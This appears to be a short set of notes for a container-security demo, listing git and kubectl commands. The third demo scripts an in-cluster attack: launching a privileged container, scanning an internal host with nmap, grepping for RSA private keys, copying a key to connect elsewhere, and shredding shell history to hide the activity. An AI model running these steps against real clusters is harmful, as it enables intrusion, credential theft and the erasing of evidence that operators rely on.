## Demo1:
git commit -am 'vuln introduced'
git push
git commit -am 'vuln removed'
git push

## Demo2:
kubectl delete deployment checkoutservice
kubectl apply -f release/kubernetes-manifests.yaml

## Demo3
kubectl apply -f privilegedContainer.yaml
kubectl exec -it nginx-privileged bash
touch ~/.bash_history && nmap 10.35.244.69 -Pn -p 50051
grep -ri -e "BEGIN RSA PRIVATE" /app
cp /app/key/throwAway.pem my_file.txt && python /app/connect.py
shred -f ~/.bash_history